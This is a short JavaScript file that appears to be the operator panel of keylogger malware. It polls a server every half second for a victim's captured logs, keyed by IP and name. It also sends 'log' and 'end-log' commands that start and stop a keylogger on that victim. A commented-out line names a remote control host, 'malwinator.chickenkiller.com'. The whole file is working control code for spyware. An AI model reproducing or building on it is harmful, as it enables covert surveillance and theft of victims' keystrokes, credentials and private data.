function fetchLog() {
    const paragraph = document.getElementById('log-data');
    const formData = new FormData();
    uri = "http://localhost:8088/getLog"
    // uri = "https://malwinator.chickenkiller.com/getLog"
    formData.append("ip", ip);
    formData.append("name", name);

    fetch(uri, {
        method: "POST",
        body: formData
    })
        .then(response => {
            return response.text();
        })
        .then(text => {
            paragraph.textContent = text;
        })
        .catch(error => {
            console.error('Error', error);
        })
}

function sendCommand(command) {
    const result = document.getElementById('commandResult');
    const formData = new FormData();
    uri = "http://localhost:8088/send"
    // uri = "https://malwinator.chickenkiller.com/getLog"
    formData.append("ip", ip);
    formData.append("name", name);
    formData.append("command", command)

    fetch(uri, {
        method: "POST",
        body: formData
    })
        .then(response => {
            return response.text();
        })
        .then(text => {
            if (text == '1')
                result.textContent = "Failed to send command!";
            else 
                if (command == 'log')
                    result.textContent = "Keylogger started!";
                else if (command == 'end-log')
                    result.textContent = "Keylogger ended!";
                else 
                result.textContent = "";

        })
        .catch(error => {
            console.error('Error', error);
        })
}

setInterval(fetchLog, 500);